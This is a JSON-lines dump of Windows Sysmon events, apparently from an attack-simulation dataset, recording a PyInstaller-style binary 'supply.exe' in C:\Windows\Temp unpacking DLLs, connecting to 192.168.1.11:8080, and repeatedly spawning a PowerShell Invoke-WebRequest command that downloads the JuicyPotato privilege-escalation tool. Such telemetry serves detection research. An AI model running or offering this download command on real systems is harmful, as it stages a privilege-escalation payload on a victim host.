{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.025","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1206-000000001D00","ProcessId":9192,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI91922\\msvcp90.dll","UtcTime":"2021-05-07 12:29:14.025"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2570,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.033832Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.025","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1306-000000001D00","ProcessId":4772,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI47722\\msvcm90.dll","UtcTime":"2021-05-07 12:29:14.025"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2571,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.034060Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.025","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1306-000000001D00","ProcessId":4772,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI47722\\msvcp90.dll","UtcTime":"2021-05-07 12:29:14.025"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2572,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.040117Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.025","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1306-000000001D00","ProcessId":4772,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI47722\\msvcr90.dll","UtcTime":"2021-05-07 12:29:14.025"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2573,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.040170Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.040","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1306-000000001D00","ProcessId":4772,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI47722\\python27.dll","UtcTime":"2021-05-07 12:29:14.040"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2574,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.098586Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.056","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1206-000000001D00","ProcessId":9192,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI91922\\msvcr90.dll","UtcTime":"2021-05-07 12:29:14.056"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2575,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.100053Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:14.087","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3299-6095-1206-000000001D00","ProcessId":9192,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI91922\\python27.dll","UtcTime":"2021-05-07 12:29:14.087"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2576,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.101679Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3299-6095-1306-000000001D00","ParentProcessId":4772,"ProcessGuid":"747F3D96-329A-6095-1406-000000001D00","ProcessId":2860,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.114"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2577,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.120613Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3299-6095-1206-000000001D00","ParentProcessId":9192,"ProcessGuid":"747F3D96-329A-6095-1506-000000001D00","ProcessId":8136,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.118"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2578,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.121175Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329A-6095-1506-000000001D00","ParentProcessId":8136,"ProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ProcessId":9228,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.970"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2579,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.981113Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329A-6095-1406-000000001D00","ParentProcessId":2860,"ProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ProcessId":9236,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.979"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2580,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:14.981696Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-3299-6095-1006-000000001D00","ProcessId":7596,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50894,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:13.924"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2581,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.042816Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-3299-6095-1106-000000001D00","ProcessId":7784,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50895,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:13.933"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2582,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.042843Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.104","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ProcessId":9228,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92282\\msvcm90.dll","UtcTime":"2021-05-07 12:29:15.104"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2583,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.122085Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.104","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ProcessId":9236,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92362\\msvcm90.dll","UtcTime":"2021-05-07 12:29:15.104"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2584,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.122128Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.135","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ProcessId":9228,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92282\\msvcp90.dll","UtcTime":"2021-05-07 12:29:15.135"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2585,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.157757Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.135","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ProcessId":9236,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92362\\msvcp90.dll","UtcTime":"2021-05-07 12:29:15.135"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2586,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.158017Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ProcessId":9228,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92282\\msvcr90.dll","UtcTime":"2021-05-07 12:29:15.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2587,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.158064Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ProcessId":9236,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92362\\msvcr90.dll","UtcTime":"2021-05-07 12:29:15.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2588,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.192503Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.199","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ProcessId":9236,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92362\\python27.dll","UtcTime":"2021-05-07 12:29:15.199"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2589,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.205595Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:15.199","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ProcessId":9228,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92282\\python27.dll","UtcTime":"2021-05-07 12:29:15.199"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2590,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.205652Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329A-6095-1706-000000001D00","ParentProcessId":9236,"ProcessGuid":"747F3D96-329B-6095-1806-000000001D00","ProcessId":9252,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:15.613"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2591,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.617944Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329A-6095-1606-000000001D00","ParentProcessId":9228,"ProcessGuid":"747F3D96-329B-6095-1906-000000001D00","ProcessId":9260,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:15.619"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2592,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:15.626732Z"}},"Version":5}}
